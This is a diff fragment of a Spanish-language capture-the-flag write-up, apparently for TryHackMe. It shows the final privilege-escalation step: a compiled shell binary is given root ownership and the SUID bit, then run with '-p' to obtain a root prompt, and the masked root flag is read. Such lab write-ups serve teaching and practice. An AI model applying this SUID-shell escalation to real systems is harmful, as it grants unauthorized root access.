@@ -363,3 +363,15 @@ gcc -o bash shell.c
 sudo chown root:root bash
 sudo chmod u+s bash
 
+Lo ejecuto.
+
+./bash -p
+
+bash-5.1# 
+
+Ya veo el # que me indica que soy root.
+
+Y finalmente consigo la tercera flag.
+
+cat /root/root.flag.
+thm{**********************************}
